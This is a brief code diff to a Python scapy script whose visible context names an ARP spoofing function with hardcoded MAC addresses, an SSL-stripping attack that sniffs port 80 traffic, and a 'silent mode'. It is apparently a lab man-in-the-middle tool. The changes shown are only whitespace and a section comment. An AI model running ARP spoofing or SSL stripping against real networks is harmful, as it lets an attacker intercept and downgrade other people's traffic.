@@ -1,8 +1,6 @@
 from scapy.all import *
 import time
 
-
-
 def ARP_spoofing():
     macM1 = "08:00:27:b7:c4:af"
     macM2 = "08:00:27:CC:28:6f"
@@ -49,6 +47,8 @@ def ssl_strip_attack():
     # prn = function to apply to each sniffed packet
     sniff(filter="tcp and port 80", prn=ssl_strip)
 	
+
+# =============== Text Interface ===============
 
 def silent_mode():
     try:
